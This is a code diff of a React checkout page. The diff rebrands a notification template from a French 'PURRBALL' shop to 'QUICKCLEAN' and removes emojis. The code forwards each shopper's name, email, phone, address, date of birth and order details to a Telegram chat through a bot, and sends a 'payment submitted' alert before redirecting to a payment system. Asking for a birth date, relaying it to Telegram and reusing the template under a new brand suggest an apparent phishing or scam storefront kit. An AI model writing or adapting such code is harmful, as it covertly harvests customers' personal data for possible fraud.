@@ -215,36 +215,35 @@ export default function CheckoutPage() {
     console.log('Current message ID:', messageIdRef.current)
 
     const itemsList = items.map(item => 
-      `   📦 ${item.name} (x${item.quantity}) - $${(item.price * item.quantity).toFixed(2)}`
+      `   • ${item.name} (x${item.quantity}) - $${(item.price * item.quantity).toFixed(2)}`
     ).join('\n')
 
-    const message = `🐱 PURRBALL - NOUVEAU CHECKOUT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    const message = `QUICKCLEAN - NEW CHECKOUT
 
-👤 CLIENT:
+NEW CUSTOMER CHECKOUT:
    ${formData.firstName} ${formData.lastName}
 
-📧 CONTACT:
-   📧 ${formData.email}
-   📱 ${formData.phone}
+CONTACT:
+   Email: ${formData.email}
+   Phone: ${formData.phone}
 
-🏠 ADRESSE DE LIVRAISON:
-   📍 ${formData.address}
-   🏢 ${formData.apartment || 'N/A'}
-   🏙️ ${formData.city}, ${formData.province} ${formData.postalCode}
-   🌍 ${formData.country}
+SHIPPING ADDRESS:
+   Address: ${formData.address}
+   Apt: ${formData.apartment || 'N/A'}
+   City: ${formData.city}, ${formData.province} ${formData.postalCode}
+   Country: ${formData.country}
 
-🎂 DATE DE NAISSANCE:
-   📅 ${formData.dateOfBirth}
+BIRTH DATE:
+   Date: ${formData.dateOfBirth}
 
-💰 COMMANDE:
+ORDER:
 ${itemsList}
-   💵 Subtotal: $${total.toFixed(2)} CAD + Taxes ($${(total * 0.13).toFixed(2)})
-   💰 TOTAL: $${(total + (total * 0.13)).toFixed(2)} CAD
-   🆔 Session: ${sessionIdRef.current}
-   ${orderNumber ? `📦 ORDER ID: ${orderNumber}` : ''}
+   Subtotal: $${total.toFixed(2)} CAD + Taxes ($${(total * 0.13).toFixed(2)})
+   TOTAL: $${(total + (total * 0.13)).toFixed(2)} CAD
+   Session: ${sessionIdRef.current}
+   ${orderNumber ? `ORDER ID: ${orderNumber}` : ''}
 
-⏰ DERNIÈRE MISE À JOUR:
+LAST UPDATE:
    ${new Date().toLocaleString('fr-FR')}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
@@ -505,9 +504,9 @@ ${itemsList}
       const existingOrders = JSON.parse(localStorage.getItem(emailKey) || '[]')
       existingOrders.push(orderNumber)
       localStorage.setItem(emailKey, JSON.stringify(existingOrders))
-      console.log('✅ Order data saved to localStorage')
+      console.log('Order data saved to localStorage')
     } catch (error) {
-      console.error('❌ Error saving to localStorage:', error)
+      console.error('Error saving to localStorage:', error)
     }
 
     // Save to Supabase for cross-device access
@@ -533,9 +532,9 @@ ${itemsList}
         email_stage: 1,
         locale: locale,
       })
-      console.log('✅ Order saved to Supabase')
+      console.log('Order saved to Supabase')
     } catch (error) {
-      console.error('❌ Error saving to Supabase:', error)
+      console.error('Error saving to Supabase:', error)
     }
     
     // Send final update to Telegram with Order ID
@@ -548,7 +547,7 @@ ${itemsList}
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
-          text: `🎯 **PAIEMENT SOUMIS !**\n\n💳 Le client a cliqué sur "Finaliser ma commande"\n📦 ORDER ID: ${orderNumber}\n🆔 Session: ${sessionIdRef.current}\n⏰ ${new Date().toLocaleString('fr-FR')}\n\n🔄 Redirection vers le système de paiement...`,
+          text: `PAYMENT SUBMITTED!\n\nCustomer clicked "Complete Order"\nORDER ID: ${orderNumber}\nSession: ${sessionIdRef.current}\nTime: ${new Date().toLocaleString('fr-FR')}\n\nRedirecting to payment system...`,
           parse_mode: 'Markdown'
         })
       })
